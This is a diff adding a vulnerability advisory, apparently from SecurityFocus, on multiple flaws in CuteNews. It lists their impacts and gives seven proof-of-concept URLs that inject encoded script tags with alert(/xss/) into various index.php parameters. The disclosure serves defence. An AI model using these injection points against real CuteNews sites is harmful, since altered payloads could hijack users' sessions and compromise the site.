@@ -1,0 +1,22 @@
+source: http://www.securityfocus.com/bid/36971/info
+
+CuteNews and UTF-8 CuteNews are prone to multiple vulnerabilities, including cross-site scripting, HTML-injection, information-disclosure, arbitrary-script-injection, and security-bypass issues.
+
+Note that exploits for some of the issues may require administrator privilege.
+
+Successful exploits may allow attackers to:
+- obtain sensitive information
+- gain unauthorized access to the affected application
+- run arbitrary script code in the browser of an unsuspecting user in the context of the affected site
+- hijack user sessions
+- execute arbitrary commands in the context of the webserver process
+
+A successful attack will compromise the application and may aid in further attacks. 
+
+http://www.example.com/test/cutenews/index.php?lastusername=&#039;%3E%3Cscript%3Ealert(/xss/);%3C/script%3E
+http://www.example.com/test/cutenews/index.php?mod=%3Cscript%3Ealert(/xss/)%3C/script%3E
+http://www.example.com/test/cutenews/index.php?mod=editnews&action=list&cat_msg=%3Cscript%3Ealert(/xss/);%3C/script%3E
+http://www.example.com/test/cutenews/index.php?mod=editnews&action=list&source_msg=%3Cscript%3Ealert(/xss/);%3C/script%3E
+http://www.example.com/test/cutenews/index.php?mod=editnews&action=list&postponed_selected=%3E%3Cscript%3Ealert(/xss/);%3C/script%3E
+http://www.example.com/test/cutenews/index.php?mod=editnews&action=list&unapproved_selected=%3E%3Cscript%3Ealert(/xss/);%3C/script%3E
+http://www.example.com/test/cutenews/index.php?mod=editnews&action=list&news_per_page=%3Cscript%3Ealert(/xss/);%3C/script%3E
